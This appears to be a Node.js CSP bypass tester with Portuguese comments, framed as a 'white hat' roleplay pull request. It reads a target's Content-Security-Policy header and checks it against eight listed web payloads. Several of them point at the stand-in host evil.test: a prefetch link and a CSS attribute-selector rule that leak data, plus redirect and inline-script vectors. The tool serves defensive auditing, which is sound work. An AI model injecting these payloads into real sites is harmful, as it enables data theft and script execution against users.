#!/usr/bin/env node
// ▓ Roleplay: White Hat — CSP Bypass Tester ▓
// Testa se a Content Security Policy pode ser contornada
// PULL REQUEST START
"use strict";

const http = require("http");
const url = require("url");

const TARGET = process.env.APP_URL || "http://127.0.0.1:8000";

const CSP_BYPASS_VECTORS = [
  {
    name: "base-uri override",
    payload: '<base href="https://evil.test/">',
    cspDirective: "base-uri",
    description: "Se base-uri não está definido, formulários podem ser redirecionados",
  },
  {
    name: "JSONP callback abuse",
    payload: '<script src="/api/callback?cb=alert(1)"></script>',
    cspDirective: "script-src",
    description: "JSONP endpoints em domínios whitelisted podem executar JS arbitrário",
  },
  {
    name: "Angular template injection",
    payload: '{{constructor.constructor("alert(1)")()}}',
    cspDirective: "script-src unsafe-eval",
    description: "Angular expressions podem bypassar CSP se unsafe-eval permitido",
  },
  {
    name: "Object data URI",
    payload: '<object data="data:text/html,<script>alert(1)</script>">',
    cspDirective: "object-src",
    description: "Se object-src não é restrito, data URIs executam JS",
  },
  {
    name: "Meta refresh redirect",
    payload: '<meta http-equiv="refresh" content="0;url=https://evil.test/">',
    cspDirective: "navigate-to",
    description: "Meta refresh pode redirecionar mesmo com CSP restritiva",
  },
  {
    name: "SVG use external",
    payload: '<svg><use href="https://evil.test/payload.svg#x"></use></svg>',
    cspDirective: "default-src",
    description: "SVG use pode carregar recursos externos",
  },
  {
    name: "Prefetch abuse",
    payload: '<link rel="prefetch" href="https://evil.test/?leak=data">',
    cspDirective: "prefetch-src",
    description: "Prefetch pode exfiltrar dados sem violar connect-src",
  },
  {
    name: "CSS injection data leak",
    payload: 'input[value^="a"]{background:url("https://evil.test/?v=a")}',
    cspDirective: "style-src",
    description: "CSS attribute selectors podem exfiltrar dados caractere por caractere",
  },
];

/**
 * Parseia um header CSP em diretivas
 * @param {string} cspHeader
 * @returns {Record<string, string[]>}
 */
function parseCSP(cspHeader) {
  if (!cspHeader) return {};
  const directives = {};
  for (const part of cspHeader.split(";")) {
    const trimmed = part.trim();
    if (!trimmed) continue;
    const [name, ...values] = trimmed.split(/\s+/);
    directives[name.toLowerCase()] = values;
  }
  return directives;
}

/**
 * Analisa quais bypasses são possíveis dado um CSP
 * @param {Record<string, string[]>} directives
 * @returns {object[]}
 */
function analyzeBypasses(directives) {
  const findings = [];
  for (const vector of CSP_BYPASS_VECTORS) {
    const relevant = vector.cspDirective.split(" ")[0];
    const values = directives[relevant] || directives["default-src"] || [];

    let vulnerable = false;
    let reason = "";

    if (!directives[relevant] && !directives["default-src"]) {
      vulnerable = true;
      reason = `Diretiva '${relevant}' não definida e sem default-src fallback`;
    } else if (values.includes("'unsafe-inline'") && relevant === "script-src") {
      vulnerable = true;
      reason = "unsafe-inline permite execução de scripts inline";
    } else if (values.includes("'unsafe-eval'") && relevant === "script-src") {
      vulnerable = true;
      reason = "unsafe-eval permite eval() e template injection";
    } else if (values.includes("*")) {
      vulnerable = true;
      reason = "Wildcard permite qualquer origem";
    } else if (values.some((v) => v.includes("*.") || v === "data:" || v === "blob:")) {
      vulnerable = true;
      reason = "Subdomain wildcard ou data:/blob: URI permitido";
    }

    findings.push({
      ...vector,
      vulnerable,
      reason: reason || "Protegido pela CSP atual",
    });
  }
  return findings;
}

/**
 * Busca CSP do alvo
 * @param {string} targetUrl
 * @returns {Promise<string>}
 */
function fetchCSP(targetUrl) {
  return new Promise((resolve) => {
    const opts = { ...url.parse(targetUrl), method: "GET", timeout: 5000 };
    const req = http.request(opts, (res) => {
      const csp = res.headers["content-security-policy"] || "";
      resolve(csp);
    });
    req.on("error", () => resolve(""));
    req.on("timeout", () => { req.destroy(); resolve(""); });
    req.end();
  });
}

if (require.main === module) {
  (async () => {
    console.log("[WHITE-HAT] CSP Bypass Tester");
    console.log(`Alvo: ${TARGET}`);
    console.log("═".repeat(50));

    const cspHeader = await fetchCSP(TARGET);
    console.log(`\nCSP Header: ${cspHeader || "(nenhum)"}`);

    const directives = parseCSP(cspHeader);
    console.log(`Diretivas: ${Object.keys(directives).length}`);

    const findings = analyzeBypasses(directives);
    const vulnCount = findings.filter((f) => f.vulnerable).length;

    console.log(`\nVetores de bypass testados: ${findings.length}`);
    console.log(`Vulneráveis: ${vulnCount}`);
    for (const f of findings) {
      const status = f.vulnerable ? "[VULN]" : "[OK]  ";
      console.log(`  ${status} ${f.name}: ${f.reason}`);
    }

    console.log("\n[WHITE-HAT] CSP Bypass Test completo");
  })();
}

module.exports = { CSP_BYPASS_VECTORS, parseCSP, analyzeBypasses, fetchCSP };
// PULL REQUEST END
